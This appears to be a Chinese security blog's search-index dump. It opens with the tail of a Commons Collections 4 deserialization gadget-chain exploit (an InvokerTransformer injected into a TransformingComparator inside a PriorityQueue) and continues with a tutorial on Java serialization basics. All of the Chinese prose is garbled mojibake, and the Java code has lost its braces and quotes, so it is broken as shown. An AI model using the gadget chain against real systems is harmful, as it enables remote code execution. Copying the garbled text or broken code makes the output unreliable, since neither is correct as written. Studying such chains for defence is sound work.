Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(transformer); transformerField.setAccessible(true); transformerField.set(transformingComparator, invokerTransformer);// serialize(priorityQueue); unserialize(ser.bin); public static void serialize(Object obj) throws IOException ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ser.bin)); oos.writeObject(obj); public static Object unserialize(String Filename) throws IOException, ClassNotFoundException ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; è¯¥é“¾å¦‚ä¸‹ï¼š cc4cc2çš„å‰æ å› ä¸º CommonsCollections4 é™¤ 4.0 çš„å…¶ä»–ç‰ˆæœ¬å»æ‰äº† InvokerTransformer ä¸å†ç»§æ‰¿ Serializableï¼Œå¯¼è‡´æ— æ³•åºåˆ—åŒ–ã€‚åŒæ—¶ CommonsCollections 4çš„ç‰ˆæœ¬ TransformingComparator ç»§æ‰¿äº† Serializableæ¥å£ï¼Œè€ŒCommonsCollections 3é‡Œæ˜¯æ²¡æœ‰çš„ã€‚è¿™ä¸ªå°±æä¾›äº†ä¸€ä¸ªæ”»å‡»çš„è·¯å¾„ jdkï¼šjdk8u65CCï¼šCommons-Collections 4.0","categories":["javaååºåˆ—åŒ–"]},{"title":"Javaåºåˆ—åŒ–ã€ååºåˆ—åŒ–ä»¥åŠåå°„","path":"/2024/10/18/Javaåºåˆ—åŒ–ã€ååºåˆ—åŒ–ä»¥åŠåå°„/","content":"å¼•ç”¨javaåºåˆ—åŒ–ï¼Œçœ‹è¿™ç¯‡å°±å¤Ÿäº† å¤§ç™½è¯è¯´Javaåå°„ï¼šå…¥é—¨ã€ä½¿ç”¨ã€åŸç† - é™ˆæ ‘ä¹‰ - åšå®¢å›­ åºåˆ—åŒ–çš„å«ä¹‰ã€æ„ä¹‰åŠä½¿ç”¨åœºæ™¯ åºåˆ—åŒ–ï¼šå°†å¯¹è±¡å†™å…¥åˆ°IOæµä¸­ ååºåˆ—åŒ–ï¼šä»IOæµä¸­æ¢å¤å¯¹è±¡ æ„ä¹‰ï¼šåºåˆ—åŒ–æœºåˆ¶å…è®¸å°†å®ç°åºåˆ—åŒ–çš„Javaå¯¹è±¡è½¬æ¢ä½å­—èŠ‚åºåˆ—ï¼Œè¿™äº›å­—èŠ‚åºåˆ—å¯ä»¥ä¿å­˜åœ¨ç£ç›˜ä¸Šï¼Œæˆ–é€šè¿‡ç½‘ç»œä¼ è¾“ï¼Œä»¥è¾¾åˆ°ä»¥åæ¢å¤æˆåŸæ¥çš„å¯¹è±¡ã€‚åºåˆ—åŒ–æœºåˆ¶ä½¿å¾—å¯¹è±¡å¯ä»¥è„±ç¦»ç¨‹åºçš„è¿è¡Œè€Œç‹¬ç«‹å­˜åœ¨ã€‚ ä½¿ç”¨åœºæ™¯ï¼šæ‰€æœ‰å¯åœ¨ç½‘ç»œä¸Šä¼ è¾“çš„å¯¹è±¡éƒ½å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œæ¯”å¦‚RMIï¼ˆremote method invoke,å³è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰ï¼Œä¼ å…¥çš„å‚æ•°æˆ–è¿”å›çš„å¯¹è±¡éƒ½æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œå¦åˆ™ä¼šå‡ºé”™ï¼›æ‰€æœ‰éœ€è¦ä¿å­˜åˆ°ç£ç›˜çš„javaå¯¹è±¡éƒ½å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚é€šå¸¸å»ºè®®ï¼šç¨‹åºåˆ›å»ºçš„æ¯ä¸ªJavaBeanç±»éƒ½å®ç°Serializeableæ¥å£ã€‚ åºåˆ—åŒ–å®ç°çš„æ–¹å¼å¦‚æœéœ€è¦å°†æŸä¸ªå¯¹è±¡ä¿å­˜åˆ°ç£ç›˜ä¸Šæˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»åº”è¯¥å®ç°Serializableæ¥å£æˆ–è€…Externalizableæ¥å£ä¹‹ä¸€ã€‚ Serializableæ™®é€šåºåˆ—åŒ–Serializableæ¥å£æ˜¯ä¸€ä¸ªæ ‡è®°æ¥å£ï¼Œä¸ç”¨å®ç°ä»»ä½•æ–¹æ³•ã€‚ä¸€æ—¦å®ç°äº†æ­¤æ¥å£ï¼Œè¯¥ç±»çš„å¯¹è±¡å°±æ˜¯å¯åºåˆ—åŒ–çš„ï¼›ä¸å®ç°æ­¤æ¥å£çš„ç±»å°†ä¸ä¼šä½¿ä»»ä½•çŠ¶æ€åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–ï¼Œä¼šæŠ›å‡º NotSerializableException åºåˆ—åŒ–æ­¥éª¤ï¼š æ­¥éª¤ä¸€ï¼šåˆ›å»ºä¸€ä¸ªObjectOutputStreamè¾“å‡ºæµï¼› æ­¥éª¤äºŒï¼šè°ƒç”¨ObjectOutputStreamå¯¹è±¡çš„writeObjectè¾“å‡ºå¯åºåˆ—åŒ–å¯¹è±¡ import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.io.Serializable;// Personç±»ï¼Œå®ç°Serializableæ¥å£public class Person implements Serializable private static final long serialVersionUID = 1L; // ç¡®ä¿åºåˆ—åŒ–ç‰ˆæœ¬ä¸€è‡´ private String name; private int age; // æ— å‚æ„é€ å™¨æœªæä¾›ï¼Œå¿…é¡»é€šè¿‡æ­¤æ„é€ å™¨åˆ›å»ºå¯¹è±¡ public Person(String name, int age) this.name = name; this.age = age; @Override public String toString() return Person + name= + name + \\ + , age= + age + ; // æµ‹è¯•å†™å…¥å¯¹è±¡çš„ä¸»æ–¹æ³• public static void main(String[] args) try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(object.txt))) // å°†Personå¯¹è±¡åºåˆ—åŒ–å¹¶å†™å…¥æ–‡ä»¶ Person person = new Person(John, 23); oos.writeObject(person); System.out.println(å¯¹è±¡å·²æˆåŠŸåºåˆ—åŒ–å¹¶å†™å…¥æ–‡ä»¶ã€‚); catch (Exception e) e.printStackTrace(); ååºåˆ—åŒ–æ­¥éª¤ï¼š æ­¥éª¤ä¸€ï¼šåˆ›å»ºä¸€ä¸ªObjectInputStreamè¾“å…¥æµï¼› æ­¥éª¤äºŒï¼šè°ƒç”¨ObjectInputStreamå¯¹è±¡çš„readObject()å¾—åˆ°åºåˆ—åŒ–çš„å¯¹è±¡ã€‚ æˆ‘ä»¬å°†ä¸Šé¢åºåˆ—åŒ–åˆ°person.txtçš„personå¯¹è±¡ååºåˆ—åŒ–å›æ¥ import java.io.*;// Personç±»ï¼Œå®ç°Serializableæ¥å£public class Person implements Serializable private static final long serialVersionUID = 1L; // ç¡®ä¿åºåˆ—åŒ–ç‰ˆæœ¬ä¸€è‡´ private String name; private int age; // æ— å‚æ„é€ å™¨æœªæä¾›ï¼Œä½¿ç”¨æ­¤æ„é€ å™¨åˆ›å»ºå¯¹è±¡ public Person(String name, int age) System.out.println(ååºåˆ—åŒ–ï¼Œä½ è°ƒç”¨æˆ‘äº†å—ï¼Ÿ); this.name = name; this.age = age; @Override public String toString() return Person + name= + name + \\ + , age= + age + ; // WriteObjectç±»ï¼šå°†Personå¯¹è±¡åºåˆ—åŒ–åˆ°æ–‡ä»¶ public static class WriteObject public static void main(String[] args) try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(person.txt))) Person person = new Person(John, 23); oos.writeObject(person); System.out.println(å¯¹è±¡å·²æˆåŠŸåºåˆ—åŒ–å¹¶å†™å…¥æ–‡ä»¶ã€‚); catch (Exception e) e.printStackTrace(); // ReadObjectç±»ï¼šä»æ–‡ä»¶ååºåˆ—åŒ–Personå¯¹è±¡ public static class ReadObject public static void main(String[] args) try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(person.txt))) Person brady = (Person) ois.readObject(); System.out.println(brady); catch (Exception e) e.printStackTrace(); ////è¾“å‡ºç»“æœ//Personname=John,Â age=23 è¾“å‡ºå‘Šè¯‰æˆ‘ä»¬ï¼Œååºåˆ—åŒ–å¹¶ä¸ä¼šè°ƒç”¨æ„é€ æ–¹æ³•ã€‚ååºåˆ—çš„å¯¹è±¡æ˜¯ç”±JVMè‡ªå·±ç”Ÿæˆçš„å¯¹è±¡ï¼Œä¸é€šè¿‡æ„é€ æ–¹æ³•ç”Ÿæˆ æˆå‘˜æ˜¯å¼•ç”¨çš„åºåˆ—åŒ–å¦‚æœä¸€ä¸ªå¯åºåˆ—åŒ–çš„ç±»çš„æˆå‘˜ä¸æ˜¯åŸºæœ¬ç±»å‹ï¼Œä¹Ÿä¸æ˜¯Stringç±»å‹ï¼Œé‚£è¿™ä¸ªå¼•ç”¨ç±»å‹ä¹Ÿå¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ï¼›å¦åˆ™ï¼Œä¼šå¯¼è‡´æ­¤ç±»ä¸èƒ½åºåˆ—åŒ–ã€‚ çœ‹ä¾‹å­ï¼Œæˆ‘ä»¬æ–°å¢ä¸€ä¸ªTeacherç±»ã€‚å°†Personå»æ‰å®ç°Serializableæ¥å£ä»£ç ã€‚ import java.io.*;// Personç±»class Person //çœç•¥ // Teacherç±»ï¼Œå®ç°Serializableæ¥å£public class Teacher implements Serializable private static final long serialVersionUID = 1L; // åºåˆ—åŒ–ç‰ˆæœ¬ID private String name; private Person person; // æ„é€ å™¨ public Teacher(String name, Person person) this.name = name; this.person = person; @Override public String toString() return Teachername= + name + , person= + person + ; // ä¸»æ–¹æ³•ï¼šè¿›è¡Œåºåˆ—åŒ– public static void main(String[] args) throws Exception // å°†Teacherå¯¹è±¡åºåˆ—åŒ–åˆ°teacher.txtæ–‡ä»¶ try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(teacher.txt))) Person person = new Person(è·¯é£, 20); Teacher teacher = new Teacher(é›·åˆ©, person); oos.writeObject(teacher); System.out.println(å¯¹è±¡å·²æˆåŠŸåºåˆ—åŒ–å¹¶å†™å…¥æ–‡ä»¶ã€‚); catch (Exception e) e.printStackTrace(); // ä»teacher.txtæ–‡ä»¶ååºåˆ—åŒ–Teacherå¯¹è±¡ try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(teacher.txt))) Teacher deserializedTeacher = (Teacher) ois.readObject(); System.out.println(ååºåˆ—åŒ–ç»“æœï¼š + deserializedTeacher); catch (Exception e) e.printStackTrace(); ä¸Šè¿°ä»£ç ä¼šåºåˆ—åŒ–å¤±è´¥ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š è¿™æ˜¯å› ä¸ºPersonç±»çš„å¯¹è±¡æ˜¯ä¸å¯åºåˆ—åŒ–çš„ï¼Œè¿™å¯¼è‡´äº†Teacherçš„å¯¹è±¡ä¸å¯åºåˆ—åŒ– åŒä¸€å¯¹è±¡åºåˆ—åŒ–å¤šæ¬¡çš„æœºåˆ¶åŒä¸€å¯¹è±¡åºåˆ—åŒ–å¤šæ¬¡ï¼Œä¼šå°†è¿™ä¸ªå¯¹è±¡åºåˆ—åŒ–å¤šæ¬¡å—ï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ã€‚ public class WriteTeacher public static void main(String[] args) throws Exception try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(teacher.txt))) Person person = new Person(è·¯é£, 20); Teacher t1 = new Teacher(é›·åˆ©, person); Teacher t2 = new Teacher(çº¢å‘é¦™å…‹æ–¯, person); //ä¾æ¬¡å°†4ä¸ªå¯¹è±¡å†™å…¥è¾“å…¥æµ oos.writeObject(t1); oos.writeObject(t2); oos.writeObject(person); oos.writeObject(t2); ä¾æ¬¡å°†t1ã€t2ã€personã€t2å¯¹è±¡åºåˆ—åŒ–åˆ°æ–‡ä»¶teacher.txtæ–‡ä»¶ä¸­ã€‚ æ³¨æ„ï¼šååºåˆ—åŒ–çš„é¡ºåºä¸åºåˆ—åŒ–æ—¶çš„é¡ºåºä¸€è‡´ã€‚ public class ReadTeacher public static void main(String[] args) try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(teacher.txt))) Teacher t1 = (Teacher) ois.readObject(); Teacher t2 = (Teacher) ois.readObject(); Person p = (Person) ois.readObject(); Teacher t3 = (Teacher) ois.readObject(); System.out.println(t1 == t2); System.out.println(t1.getPerson() == p); System.out.println(t2.getPerson() == p); System.out.println(t2 == t3); System.out.println(t1.getPerson() == t2.getPerson()); catch (Exception e) e.printStackTrace(); //è¾“å‡ºç»“æœ//false//true//true//true//true ä»è¾“å‡ºç»“æœå¯ä»¥çœ‹å‡ºï¼ŒJavaåºåˆ—åŒ–åŒä¸€å¯¹è±¡ï¼Œå¹¶ä¸ä¼šå°†æ­¤å¯¹è±¡åºåˆ—åŒ–å¤šæ¬¡å¾—åˆ°å¤šä¸ªå¯¹è±¡ã€‚ Javaåºåˆ—åŒ–ç®—æ³• æ‰€æœ‰ä¿å­˜åˆ°ç£ç›˜çš„å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåºåˆ—åŒ–ç¼–ç å· å½“ç¨‹åºè¯•å›¾åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šå…ˆæ£€æŸ¥æ­¤å¯¹è±¡æ˜¯å¦å·²ç»åºåˆ—åŒ–è¿‡ï¼Œåªæœ‰æ­¤å¯¹è±¡ä»æœªï¼ˆåœ¨æ­¤è™šæ‹Ÿæœºï¼‰è¢«åºåˆ—åŒ–è¿‡ï¼Œæ‰ä¼šå°†æ­¤å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—èŠ‚åºåˆ—è¾“å‡ºã€‚ å¦‚æœæ­¤å¯¹è±¡å·²ç»åºåˆ—åŒ–è¿‡ï¼Œåˆ™ç›´æ¥è¾“å‡ºç¼–å·å³å¯ ä¸‹å›¾è¡¨ç¤ºä¸Šè¿°åºåˆ—åŒ–è¿‡ç¨‹ å¯é€‰çš„è‡ªå®šä¹‰åºåˆ—åŒ– æœ‰äº›æ—¶å€™ï¼Œæˆ‘ä»¬æœ‰è¿™æ ·çš„éœ€æ±‚ï¼ŒæŸäº›å±æ€§ä¸éœ€è¦åºåˆ—åŒ–ã€‚ä½¿ç”¨transientå…³é”®å­—é€‰æ‹©ä¸éœ€è¦åºåˆ—åŒ–çš„å­—æ®µã€‚ï¼ˆè¯´æ˜è¯¥å±æ€§æ˜¯ç¬æ€çš„ï¼‰ public class Person implements Serializable //ä¸éœ€è¦åºåˆ—åŒ–åå­—ä¸å¹´é¾„ private transient String name; private transient int age; private int height; private transient boolean singlehood; public Person(String name, int age) this.name = name; this.age = age; //çœç•¥get,setæ–¹æ³•public class TransientTest public static void main(String[] args) throws Exception try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(person.txt)); ObjectInputStream ios = new ObjectInputStream(new FileInputStream(person.txt))) Person person = new Person(John, 23); person.setHeight(185); System.out.println(person); oos.writeObject(person); Person p1 = (Person)ios.readObject(); System.out.println(p1); //è¾“å‡ºç»“æœ//Personname=John, age=23, singlehood=true, height=185cm//Personname=null, age=0, singlehood=false, height=185cm ä»è¾“å‡ºæˆ‘ä»¬çœ‹åˆ°ï¼Œä½¿ç”¨transientä¿®é¥°çš„å±æ€§ï¼Œjavaåºåˆ—åŒ–æ—¶ï¼Œä¼šå¿½ç•¥æ‰æ­¤å­—æ®µï¼Œæ‰€ä»¥ååºåˆ—åŒ–å‡ºçš„å¯¹è±¡ï¼Œè¢«transientä¿®é¥°çš„å±æ€§æ˜¯é»˜è®¤å€¼ã€‚å¯¹äºå¼•ç”¨ç±»å‹ï¼Œå€¼æ˜¯nullï¼›åŸºæœ¬ç±»å‹ï¼Œå€¼æ˜¯0ï¼›booleanç±»å‹ï¼Œå€¼æ˜¯false ä½¿ç”¨transientè™½ç„¶ç®€å•ï¼Œä½†å°†æ­¤å±æ€§å®Œå…¨éš”ç¦»åœ¨äº†åºåˆ—åŒ–ä¹‹å¤–ã€‚javaæä¾›äº†å¯é€‰çš„è‡ªå®šä¹‰åºåˆ—åŒ–ã€‚å¯ä»¥è¿›è¡Œæ§åˆ¶åºåˆ—åŒ–çš„æ–¹å¼ï¼Œæˆ–è€…å¯¹åºåˆ—åŒ–æ•°æ®è¿›è¡Œç¼–ç åŠ å¯†ç­‰ã€‚ private void writeObject(java.io.ObjectOutputStream out) throws IOExceptionï¼›private void readObject(java.io.ObjectIutputStream in) throws IOException,ClassNotFoundException;private void readObjectNoData() throws ObjectStreamException; é€šè¿‡é‡å†™writeObjectä¸readObjectæ–¹æ³•ï¼Œå¯ä»¥è‡ªå·±é€‰æ‹©å“ªäº›å±æ€§éœ€è¦åºåˆ—åŒ–ï¼Œ å“ªäº›å±æ€§ä¸éœ€è¦ã€‚å¦‚æœwriteObjectä½¿ç”¨æŸç§è§„åˆ™åºåˆ—åŒ–ï¼Œåˆ™ç›¸åº”çš„readObjectéœ€è¦ç›¸åçš„è§„åˆ™ååºåˆ—åŒ–ï¼Œä»¥ä¾¿èƒ½æ­£ç¡®ååºåˆ—åŒ–å‡ºå¯¹è±¡ã€‚è¿™é‡Œå±•ç¤ºå¯¹åå­—è¿›è¡Œåè½¬åŠ å¯†ã€‚ public class Person implements Serializable private String name; private int age; //çœç•¥æ„é€ æ–¹æ³•ï¼ŒgetåŠsetæ–¹æ³• private void writeObject(ObjectOutputStream out) throws IOException //å°†åå­—åè½¬å†™å…¥äºŒè¿›åˆ¶æµ out.writeObject(new StringBuffer(this.name).reverse()); out.writeInt(age); private void readObject(ObjectInputStream ins) throws IOException,ClassNotFoundException //å°†è¯»å‡ºçš„å­—ç¬¦ä¸²åè½¬æ¢å¤å›æ¥ this.name = ((StringBuffer)ins.readObject()).reverse().toString(); this.age = ins.readInt(); å½“åºåˆ—åŒ–æµä¸å®Œæ•´æ—¶ï¼ŒreadObjectNoData()æ–¹æ³•å¯ä»¥ç”¨æ¥æ­£ç¡®åœ°åˆå§‹åŒ–ååºåˆ—åŒ–çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ä¸åŒç±»æ¥æ”¶ååºåˆ—åŒ–å¯¹è±¡ï¼Œæˆ–è€…åºåˆ—åŒ–æµè¢«ç¯¡æ”¹æ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šè°ƒç”¨readObjectNoData()æ–¹æ³•æ¥åˆå§‹åŒ–ååºåˆ—åŒ–çš„å¯¹è±¡ã€‚ å¯é€‰çš„è‡ªå®šä¹‰åºåˆ—åŒ– ä½¿ç”¨transientè™½ç„¶ç®€å•ï¼Œä½†å°†æ­¤å±æ€§å®Œå…¨éš”ç¦»åœ¨äº†åºåˆ—åŒ–ä¹‹å¤–ã€‚javaæä¾›äº†å¯é€‰çš„è‡ªå®šä¹‰åºåˆ—åŒ–ã€‚å¯ä»¥è¿›è¡Œæ§åˆ¶åºåˆ—åŒ–çš„æ–¹å¼ï¼Œæˆ–è€…å¯¹åºåˆ—åŒ–æ•°æ®è¿›è¡Œç¼–ç åŠ å¯†ç­‰ã€‚ rivate void writeObject(java.io.ObjectOutputStream out) throws IOExceptionï¼›private void readObject(java.io.ObjectIutputStream in) throws IOException,ClassNotFoundException;private void readObjectNoData() throws ObjectStreamException; é€šè¿‡é‡å†™writeObjectä¸readObjectæ–¹æ³•ï¼Œå¯ä»¥è‡ªå·±é€‰æ‹©å“ªäº›å±æ€§éœ€è¦åºåˆ—åŒ–ï¼Œ å“ªäº›å±æ€§ä¸éœ€è¦ã€‚å¦‚æœwriteObjectä½¿ç”¨æŸç§è§„åˆ™åºåˆ—åŒ–ï¼Œåˆ™ç›¸åº”çš„readObjectéœ€è¦ç›¸åçš„è§„åˆ™ååºåˆ—åŒ–ï¼Œä»¥ä¾¿èƒ½æ­£ç¡®ååºåˆ—åŒ–å‡ºå¯¹è±¡ã€‚è¿™é‡Œå±•ç¤ºå¯¹åå­—è¿›è¡Œåè½¬åŠ å¯†ã€‚ public class Person implements Serializable private String name; private int age; //çœç•¥æ„é€ æ–¹æ³•ï¼ŒgetåŠsetæ–¹æ³• private void writeObject(ObjectOutputStream out) throws IOException //å°†åå­—åè½¬å†™å…¥äºŒè¿›åˆ¶æµ out.writeObject(new StringBuffer(this.name).reverse()); out.writeInt(age); private void readObject(ObjectInputStream ins) throws IOException,ClassNotFoundException //å°†è¯»å‡ºçš„å­—ç¬¦ä¸²åè½¬æ¢å¤å›æ¥ this.name = ((StringBuffer)ins.readObject()).reverse().toString(); this.age = ins.readInt(); å½“åºåˆ—åŒ–æµä¸å®Œæ•´æ—¶ï¼ŒreadObjectNoData()æ–¹æ³•å¯ä»¥ç”¨æ¥æ­£ç¡®åœ°åˆå§‹åŒ–ååºåˆ—åŒ–çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ä¸åŒç±»æ¥æ”¶ååºåˆ—åŒ–å¯¹è±¡ï¼Œæˆ–è€…åºåˆ—åŒ–æµè¢«ç¯¡æ”¹æ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šè°ƒç”¨readObjectNoData()æ–¹æ³•æ¥åˆå§‹åŒ–ååºåˆ—åŒ–çš„å¯¹è±¡ã€‚ æ›´å½»åº•çš„è‡ªå®šä¹‰åºåˆ—åŒ– ANY-ACCESS-MODIFIER Object writeReplace() throws ObjectStreamException; ANY-ACCESS-MODIFIER Object readResolve() throws ObjectStreamException; writeReplaceï¼šåœ¨åºåˆ—åŒ–æ—¶ï¼Œä¼šå…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œå†è°ƒç”¨writeObjectæ–¹æ³•ã€‚æ­¤æ–¹æ³•å¯å°†ä»»æ„å¯¹è±¡ä»£æ›¿ç›®æ ‡åºåˆ—åŒ–å¯¹è±¡ java ä»£ç è§£è¯»å¤åˆ¶ä»£ç public class Person implements Serializable private String name; private int age; //çœç•¥æ„é€ æ–¹æ³•ï¼ŒgetåŠsetæ–¹æ³• private Object writeReplace() throws ObjectStreamException ArrayListObject list = new ArrayList(2); list.add(this.name); list.add(this.age); return list; public static void main(String[] args) throws Exception try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(person.txt)); ObjectInputStream ios = new ObjectInputStream(new FileInputStream(person.txt))) Person person = new Person(John, 23); oos.writeObject(person); ArrayList list = (ArrayList)ios.readObject(); System.out.println(list); //è¾“å‡ºç»“æœ//[John, 23] readResolveï¼šååºåˆ—åŒ–æ—¶æ›¿æ¢ååºåˆ—åŒ–å‡ºçš„å¯¹è±¡ï¼Œååºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡è¢«ç«‹å³ä¸¢å¼ƒã€‚æ­¤æ–¹æ³•åœ¨readeObjectåè°ƒç”¨ã€‚ java ä»£ç è§£è¯»å¤åˆ¶ä»£ç public class Person implements Serializable private String name; private int age; //çœç•¥æ„é€ æ–¹æ³•ï¼ŒgetåŠsetæ–¹æ³• private Object readResolve() throws ObjectStreamException return new (brady, 23); public static void main(String[] args) throws Exception try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(person.txt)); ObjectInputStream ios = new ObjectInputStream(new FileInputStream(person.txt))) Person person = new Person(John, 23); oos.writeObject(person); HashMap map = (HashMap)ios.readObject(); System.out.println(map); //è¾“å‡ºç»“æœ//brady=23 readResolveå¸¸ç”¨æ¥ååºåˆ—å•ä¾‹ç±»ï¼Œä¿è¯å•ä¾‹ç±»çš„å”¯ä¸€æ€§ã€‚ æ³¨æ„ï¼šreadResolveä¸writeReplaceçš„è®¿é—®ä¿®é¥°ç¬¦å¯ä»¥æ˜¯privateã€protectedã€publicï¼Œå¦‚æœçˆ¶ç±»é‡å†™äº†è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œå­ç±»éƒ½éœ€è¦æ ¹æ®è‡ªèº«éœ€æ±‚é‡å†™ï¼Œè¿™æ˜¾ç„¶ä¸æ˜¯ä¸€ä¸ªå¥½çš„è®¾è®¡ã€‚é€šå¸¸å»ºè®®å¯¹äºfinalä¿®é¥°çš„ç±»é‡å†™readResolveæ–¹æ³•æ²¡æœ‰é—®é¢˜ï¼›å¦åˆ™ï¼Œé‡å†™readResolveä½¿ç”¨privateä¿®é¥°ã€‚ Externalizableï¼šå¼ºåˆ¶è‡ªå®šä¹‰åºåˆ—åŒ–é€šè¿‡å®ç°Externalizableæ¥å£ï¼Œå¿…é¡»å®ç°writeExternalã€readExternalæ–¹æ³•ã€‚ public interface Externalizable extends java.io.Serializable void writeExternal(ObjectOutput out) throws IOException; void readExternal(ObjectInput in) throws IOException, ClassNotFoundException;public class ExPerson implements Externalizable private String name; private int age; //æ³¨æ„ï¼Œå¿…é¡»åŠ ä¸Špulic æ— å‚æ„é€ å™¨ public ExPerson() public ExPerson(String name, int age) this.name = name; this.age = age; @Override public void writeExternal(ObjectOutput out) throws IOException //å°†nameåè½¬åå†™å…¥äºŒè¿›åˆ¶æµ StringBuffer reverse = new StringBuffer(name).reverse(); System.out.println(reverse.toString()); out.writeObject(reverse); out.writeInt(age); @Override public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException //å°†è¯»å–çš„å­—ç¬¦ä¸²åè½¬åèµ‹å€¼ç»™nameå®ä¾‹å˜é‡ this.name = ((StringBuffer) in.readObject()).reverse().toString(); System.out.println(name); this.age = in.readInt(); public static void main(String[] args) throws IOException, ClassNotFoundException try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ExPerson.txt)); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(ExPerson.txt))) oos.writeObject(new ExPerson(brady, 23)); ExPerson ep = (ExPerson) ois.readObject(); System.out.println(ep); //è¾“å‡ºç»“æœ//ydarb//brady//ExPersonname=brady, age=23 æ³¨æ„ï¼šExternalizableæ¥å£ä¸åŒäºSerializableæ¥å£ï¼Œå®ç°æ­¤æ¥å£å¿…é¡»å®ç°æ¥å£ä¸­çš„ä¸¤ä¸ªæ–¹æ³•å®ç°è‡ªå®šä¹‰åºåˆ—åŒ–ï¼Œè¿™æ˜¯å¼ºåˆ¶æ€§çš„ï¼›ç‰¹åˆ«ä¹‹å¤„æ˜¯å¿…é¡»æä¾›pulicçš„æ— å‚æ„é€ å™¨ï¼Œå› ä¸ºåœ¨ååºåˆ—åŒ–çš„æ—¶å€™éœ€è¦åå°„åˆ›å»ºå¯¹è±¡ã€‚ åœ¨ Java ä¸­ï¼Œå½“ä½ ä½¿ç”¨ ObjectOutputStream å’Œ ObjectInputStream æ¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–å®ç°äº† Externalizable æ¥å£çš„ç±»æ—¶ï¼š writeObject() ä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡çš„ writeExternal() æ–¹æ³•ã€‚ readObject() ä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡çš„ readExternal() æ–¹æ³•ã€‚ å› æ­¤ï¼Œå³ä½¿æˆ‘ä»¬åœ¨ä»£ç é‡Œæ²¡æœ‰æ˜¾å¼è°ƒç”¨ writeExternal() å’Œ readExternal()ï¼Œå®ƒä»¬ä¼šåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­è¢« Java åº•å±‚è‡ªåŠ¨è§¦å‘ åºåˆ—åŒ–ç‰ˆæœ¬å·serialVersionUIDæˆ‘ä»¬çŸ¥é“ï¼Œååºåˆ—åŒ–å¿…é¡»æ‹¥æœ‰classæ–‡ä»¶ï¼Œä½†éšç€é¡¹ç›®çš„å‡çº§ï¼Œclassæ–‡ä»¶ä¹Ÿä¼šå‡çº§ï¼Œåºåˆ—åŒ–æ€ä¹ˆä¿è¯å‡çº§å‰åçš„å…¼å®¹æ€§å‘¢ï¼Ÿ javaåºåˆ—åŒ–æä¾›äº†ä¸€ä¸ªprivate static final long serialVersionUID çš„åºåˆ—åŒ–ç‰ˆæœ¬å·ï¼Œåªæœ‰ç‰ˆæœ¬å·ç›¸åŒï¼Œå³ä½¿æ›´æ”¹äº†åºåˆ—åŒ–å±æ€§ï¼Œå¯¹è±¡ä¹Ÿå¯ä»¥æ­£ç¡®è¢«ååºåˆ—åŒ–å›æ¥ã€‚ serialVersionUIDæœ‰ä¸¤ç§æ˜¾ç¤ºçš„ç”Ÿæˆæ–¹å¼ï¼š ä¸€æ˜¯é»˜è®¤çš„1Lï¼Œæ¯”å¦‚ï¼šprivate static final long serialVersionUID = 1L; äºŒæ˜¯æ ¹æ®ç±»åã€æ¥å£åã€æˆå‘˜æ–¹æ³•åŠå±æ€§ç­‰æ¥ç”Ÿæˆä¸€ä¸ª64ä½çš„å“ˆå¸Œå­—æ®µï¼Œæ¯”å¦‚:private static final long serialVersionUID = xxxxL; public class Person implements Serializable //åºåˆ—åŒ–ç‰ˆæœ¬å· private static final long serialVersionUID = 1111013L; private String name; private int age; //çœç•¥æ„é€ æ–¹æ³•åŠget,set å¦‚æœååºåˆ—åŒ–ä½¿ç”¨çš„classçš„ç‰ˆæœ¬å·ä¸åºåˆ—åŒ–æ—¶ä½¿ç”¨çš„ä¸ä¸€è‡´ï¼Œååºåˆ—åŒ–ä¼šæŠ¥InvalidClassExceptionå¼‚å¸¸ åºåˆ—åŒ–ç‰ˆæœ¬å·å¯è‡ªç”±æŒ‡å®šï¼Œå¦‚æœä¸æŒ‡å®šï¼ŒJVMä¼šæ ¹æ®ç±»ä¿¡æ¯è‡ªå·±è®¡ç®—ä¸€ä¸ªç‰ˆæœ¬å·ï¼Œè¿™æ ·éšç€classçš„å‡çº§ï¼Œå°±æ— 